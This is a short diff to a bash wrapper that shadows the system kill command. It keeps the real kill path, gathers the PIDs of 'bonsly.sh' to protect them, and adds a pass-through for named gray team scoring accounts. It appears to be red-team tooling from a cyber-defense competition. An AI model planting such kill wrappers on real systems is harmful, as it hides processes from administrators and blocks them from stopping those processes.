@@ -1,6 +1,12 @@
 #!/bin/bash
 REAL_KILL="/usr/bin/kill"
 
+# Pass straight through for gray team scoring accounts
+case "$(whoami)" in
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_KILL "$@" ;;
+esac
+
+
 # Get bonsly PIDs to protect
 BONSLY_PIDS=$(pgrep -f "bonsly.sh" 2>/dev/null)
 
